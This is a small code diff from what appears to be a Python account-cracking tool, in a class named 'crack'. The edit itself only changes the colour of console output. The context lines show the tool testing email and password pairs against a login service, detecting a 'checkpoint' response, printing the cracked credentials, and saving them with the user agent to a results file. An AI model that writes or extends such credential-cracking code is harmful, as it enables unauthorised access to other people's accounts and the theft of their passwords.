@@ -370,8 +370,8 @@ class crack:
                         break
                     elif 'checkpoint' in r.cookies.get_dict().keys():
                         tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
-                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
-                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
+                        tree.add(f"[bold yellow]Email : {email}").add(f"[bold yellow]Password : {pws}", style = "bold white")
+                        tree.add(f"[bold yellow]Useragent : {self.useragent}", style = "bold white")
                         print(tree)
                         self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                         open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
